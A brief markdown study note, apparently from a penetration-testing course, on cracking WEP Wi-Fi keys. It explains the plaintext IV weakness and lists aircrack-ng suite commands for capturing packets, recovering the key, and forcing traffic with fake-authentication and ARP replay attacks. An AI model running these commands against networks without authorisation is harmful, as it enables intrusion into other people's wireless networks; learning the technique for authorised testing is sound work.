# WEP Cracking

## Theory:

1. WEP is `symetrical`

2. WEP generates an `unique key` for each packet

3. What key? : `Random 24 bits Initialization Vector + Password`

4. Then we use this key to encrypt packets

5. After encyrpting, `WEP sends 24 bits IV (in plain text) within the packet`

6. SO:

* Once we capture the packet, 
* We have IV and the eventual packet,
* WE can use IV and eventual packet to `get password`

## What to do:

### If there are many ENC = WEP, because for WEP we need stat hacking, which needs a lot data
1. `Capture Packets`: ``airodump-ng wlan0 --bssid xx --channel xx --write write_file` to write received data into "write_file"

2. `Analyze Packets`: `aircrack-ng write_file` to get the pwd

3. You might have pwd like `12:21:33:44:55`, remove `:` to get `1221334455`

### If there are very little data
1. If there are very little data, we cannot find `24 random bits IV`

2. `Fake Auth Attack`. We tell that AP, `dude, I need to communicate with you, send me some packets for response`. Below commands associate our MAC with target MAC

`airodump-ng wlan0 --bssid xxx --channel xxx --write some_file`

`aireplay-ng --fakeauth 0 -a TARGET_MAC -h HOST_MAC wlan0` to ASSOCIATE with the AP, basically to build a connection

3. `ARP Request Replay`: 

`aireplay-ng --arpreplay -b TARGET_MAC -h HOST_MAC wlan0` It is an ARP request attack, you know, to force target to send packets
